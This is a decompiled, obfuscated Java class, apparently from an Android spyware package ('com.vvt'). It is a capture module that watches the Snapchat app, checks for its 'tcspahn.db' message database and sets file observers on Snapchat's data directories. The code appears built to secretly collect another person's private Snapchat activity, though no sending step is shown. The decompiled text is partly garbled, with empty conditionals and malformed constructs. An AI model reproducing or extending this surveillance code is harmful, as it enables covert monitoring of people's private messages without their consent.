package com.vvt.capture.snapchat.a;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class a
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private f d;
  private f e;
  private d f;
  private i g;
  private j h;
  private Context i;
  private RunningMode j;
  private String k;
  private com.vvt.base.b l;
  private b m;
  private boolean n;
  private boolean o;
  private int p;
  
  public a(String paramString, Context paramContext, com.vvt.base.b paramb, RunningMode paramRunningMode)
  {
    this.k = paramString;
    this.l = paramb;
    this.i = paramContext;
    this.j = paramRunningMode;
  }
  
  private void b(String paramString)
  {
    try
    {
      String str = this.k;
      Object localObject2 = this.l;
      localObject2 = ((com.vvt.base.b)localObject2).f();
      Object localObject3 = this.l;
      localObject3 = ((com.vvt.base.b)localObject3).g();
      RunningMode localRunningMode = this.j;
      com.vvt.capture.snapchat.d.a(paramString, str, (String)localObject2, (String)localObject3, localRunningMode);
      str = com.vvt.capture.snapchat.d.b();
      localObject2 = com.vvt.capture.snapchat.d.c();
      d(str, (String)localObject2);
      c(paramString);
      return;
    }
    finally {}
  }
  
  private void c(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    b localb = this.m;
    if (localb != null)
    {
      localb = this.m;
      localb.stopWatching();
    }
    localb = new com/vvt/capture/snapchat/a/b;
    localb.<init>(this, paramString);
    this.m = localb;
    this.m.startWatching();
  }
  
  private void d(String paramString1, String paramString2)
  {
    f localf = this.d;
    if (localf != null)
    {
      localf = this.d;
      localf.stopWatching();
    }
    localf = new com/vvt/capture/snapchat/a/f;
    localf.<init>(this, paramString1);
    this.d = localf;
    this.d.startWatching();
    localf = this.e;
    if (localf != null)
    {
      localf = this.e;
      localf.stopWatching();
    }
    localf = new com/vvt/capture/snapchat/a/f;
    localf.<init>(this, paramString2);
    this.e = localf;
    this.e.startWatching();
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.n = bool;
    this.g = parami;
    j localj = this.h;
    if (localj == null)
    {
      localj = j.a();
      this.h = localj;
    }
    localj = this.h;
    String str = "com.snapchat.android";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      localb = this.m;
      if (localb != null)
      {
        bool = a;
        if (bool) {}
        localb = this.m;
        localb.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        b localb;
        bool = c;
        if (!bool) {}
      }
    }
    localb = null;
    this.m = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.n = false;
      localObject = this.m;
      if (localObject != null)
      {
        bool = a;
        if (bool) {}
        localObject = this.m;
        ((b)localObject).stopWatching();
        bool = false;
        localObject = null;
        this.m = null;
      }
      localObject = this.h;
      if (localObject != null)
      {
        localObject = this.h;
        String str = "com.snapchat.android";
        ((j)localObject).a(str);
      }
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        ((d)localObject).stopWatching();
        bool = false;
        localObject = null;
        this.f = null;
      }
      localObject = this.d;
      if (localObject != null)
      {
        localObject = this.d;
        ((f)localObject).stopWatching();
        bool = false;
        localObject = null;
        this.d = null;
      }
      localObject = this.e;
      if (localObject != null)
      {
        localObject = this.e;
        ((f)localObject).stopWatching();
        bool = false;
        localObject = null;
        this.e = null;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    bool1 = a;
    if (bool1) {}
    try
    {
      Object localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append(paramString2);
      Object localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "tcspahn.db";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool2 = ((File)localObject2).exists();
      if (bool2)
      {
        localObject2 = this.m;
        if (localObject2 == null)
        {
          localObject2 = com.vvt.capture.snapchat.d.d();
          boolean bool3 = com.vvt.ag.b.a((String)localObject2);
          if (!bool3)
          {
            bool2 = com.vvt.capture.snapchat.b.c((String)localObject2);
            this.o = bool2;
            bool2 = this.o;
            if (bool2) {
              b((String)localObject1);
            }
            localObject1 = com.vvt.capture.snapchat.d.e();
            localObject2 = this.f;
            if (localObject2 == null)
            {
              localObject2 = new com/vvt/capture/snapchat/a/d;
              ((d)localObject2).<init>(this, (String)localObject1);
              this.f = ((d)localObject2);
            }
            localObject1 = this.f;
            ((d)localObject1).startWatching();
          }
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */